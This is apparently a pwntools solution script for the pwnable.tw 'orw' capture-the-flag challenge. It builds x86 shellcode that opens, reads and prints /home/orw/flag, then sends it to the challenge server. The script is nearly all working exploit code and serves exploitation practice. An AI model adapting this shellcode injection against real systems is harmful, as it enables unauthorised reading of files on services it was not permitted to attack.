from pwn import *

pathname = "/home/orw/flag"
tmp = [
    "xor eax, eax",
    "push eax",

    # pathname
    "push %s" % (u32(b'ag\0\0')),
    "push %s" % (u32(b'w/fl')),
    "push %s" % (u32(b'e/or')),
    "push %s" % (u32(b'/hom')),

    # demo: write(1, pathname, 14)
    # "mov al, 0x4", # SYS_write
    # "mov bl, 0x1", 
    # "mov ecx, esp",
    # "mov edx, 0xe",
    
    # open('/home/orw/flag')
    "mov al, 0x5",
    "mov ebx, esp",
    "xor ecx, ecx",
    "xor edx, edx",
    "int 0x80",
    "mov ebx, eax",

    # read()
    "mov al, 0x3",
    # "mov ebx, r8d",
    "mov ecx, esp",
    "mov dl, 0x30",
    "int 0x80",

    # write
    "mov al, 0x4",
    "mov bl, 0x1",
    "mov ecx, esp",
    "mov dl, 0x30",
    "int 0x80",
]

shellcode = b''
for s in tmp:
    shellcode += asm(s)

r = remote('chall.pwnable.tw', 10001)
r.recvuntil(b':')
r.send(shellcode)

r.interactive()